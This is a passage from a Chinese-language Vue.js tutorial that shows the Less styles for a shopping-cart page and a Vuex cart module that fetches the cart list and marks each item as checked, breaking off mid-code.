#808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"CartPage"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #6A9955">// 主题 padding</span></span><span class="line"><span style="color: #D7BA7D">.cart</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f5f5f5</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">min-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100vh</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.cart-title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.all</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">i</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-style</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">normal</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">2px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.edit</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.van-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">18px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.cart-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ffffff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.show</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.info</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">210px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">column</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.bottom</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #D7BA7D">.price</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-end</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #D7BA7D">span</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #D7BA7D">.count-box</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">110px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #D7BA7D">.add</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #D7BA7D">.minus</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">outline</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #D7BA7D">.inp</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">outline</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.footer-fixed</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#ccc</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.all-check</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.van-checkbox</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.all-total</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.price</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.totalPrice</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">18px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-style</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">normal</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.goPay</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.delete</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">min-width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2f21</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">18px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">&amp;.disabled</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ff9779</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h3 id="构建-vuex-cart-模块"><a class="markdownIt-Anchor" href="#构建-vuex-cart-模块"></a> 构建 vuex cart 模块</h3><p>新建子模块 cart：<code>@/store/modules/cart</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getCartList</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/cart"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">namespaced:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">state</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 提供一个数组用于存储购物车列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">cartList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mutations:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 提供方法可以设置购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setCartList</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">newCartList</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">newCartList</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">actions:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 异步获取购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCartAction</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">data</span><span style="color: #D4D4D4"> } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCartList</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 由于后台返回数据中不包括是否选中的状态，所以本地自己维护，给每一项添加上被选中的状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">element</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">element</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"setCartList"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getters:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>到 vuex 中挂载：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Cart</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'@/store/modules/cart'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C8C8C8">modules</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">User</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">Cart</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><p>购物车页面中使用 created 调用 actions 异步</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 判断是否登录</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">token</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取购物车数据</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart/getCartAction'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><h3 id="动态渲染"><a class="markdownIt-Anchor" href="#动态渲染"></a> 动态渲染</h3><p>接口地址：/cart/list</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408311201545.png" alt="image-20240831120141410"></p><p>使用辅助函数映射数组：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">mapState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'vuex'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C8C8C8">computed</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapState</span><span style="color: #D4D4D4">(</span><span style="color: 